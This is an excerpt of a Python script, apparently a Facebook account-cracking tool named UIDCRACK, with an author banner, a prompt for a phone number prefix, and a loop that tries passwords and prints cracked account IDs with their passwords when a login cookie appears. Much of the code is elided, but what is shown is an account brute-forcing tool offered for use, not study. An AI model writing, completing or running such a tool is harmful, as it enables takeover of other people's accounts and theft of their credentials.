...
def banner():
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %sMontasir Sabit                   %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/Montasir000  %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/Montasir00       %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s3.0                          %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s》%s》%s》%sUIDCRACK%s《%s《%s《'%(M,H,B,H,B,H,M))
	print("")
...
def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		...
		print('\n\n [%s!%s] NO RESULT YOUR BAD LUCK :(:('%(H,H));exit()
...
def random_number():
	...
	print(f" {M}FOR EXAMPLE : {Z}[{H}+8801819400400{Z}]\n")
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [MONTASIR-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [MONTASIR-CP] '+uidx+' | '+pasw+'\033[0;97m')
